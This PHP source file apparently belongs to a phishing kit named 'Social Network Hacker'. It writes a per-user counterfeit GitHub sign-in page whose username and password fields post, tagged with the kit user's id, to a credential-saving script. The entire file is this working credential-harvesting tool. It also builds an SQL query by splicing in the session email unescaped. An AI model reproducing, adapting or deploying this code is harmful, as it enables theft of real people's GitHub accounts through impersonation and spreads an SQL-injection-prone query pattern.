<?php
if(isset($_POST['github'])){
    $sql = "SELECT id FROM registered_users WHERE email = '".$_SESSION['email']."'";
    $result = $conn->query($sql);
    $row = $result->fetch_assoc();
    // echo "<script> console.log(".$row['id'].");</script>";
    $userId = $row['id'];
    $myfile = fopen("../GenerationFiles/github".$userId.".php", "w") or die("Unable to open file!");
    // $gitpageLink = "http://localhost/Project/Social%20Network%20Hacker/GenerationFiles/github".$userId.".php";
    $gitpageLink = "http://$_SERVER[HTTP_HOST]/SNH/GenerationFiles/github".$userId.".php";
    $fbCode = '
    <!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Github Page </title>
    <link rel="stylesheet" href="../stylesheet/github.css">
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/25/25231.png">
    <script src="https://kit.fontawesome.com/f46d34a733.js" crossorigin="anonymous"></script>
  </head>
  <body>
    <div class="cont">
      <!-- ICON -->
      <i class="fab fa-github"></i>
      <p class="a">Sign in to Github</p>
      <!-- FORM BOX -->
      <form method="post" action="../Component/savedData.php">
        <!-- USERNAME BOX-->
        <label for="username"><b>Username or email address</b></label><br>
        <input type="text" name="email" value="" autofocus="true" autocomplete="username"><br>
        <!-- PASSWORD BOX -->
        <label for="password">
          Password
          <a href="">Forgot password?</a>
        </label><br>
        <input type="password" name="password" value=""><br>
        <!-- SIGN IN BUTTON -->
        <input type="submit" name="saveData" value="Sign in">
        <input type="hidden" name="userId"  value="'.$userId.'">
        <input type="hidden" name="social"  value="Github">

      </form>
      <!-- LAST BOX, SIGN UP -->
      <div class="lastPart">
        New to GitHub? <a href="">Create an account</a>.
      </div>

      <div class="footer">
        <a href="">Terms</a>
        <a href="">Privacy</a>
        <a href="">Security</a>
        <a href="">Contact Github</a>
      </div>

    </div> <!-- cont -->
  </body>
</html>
';
    fwrite($myfile,$fbCode);
    fclose($myfile);
  }
?>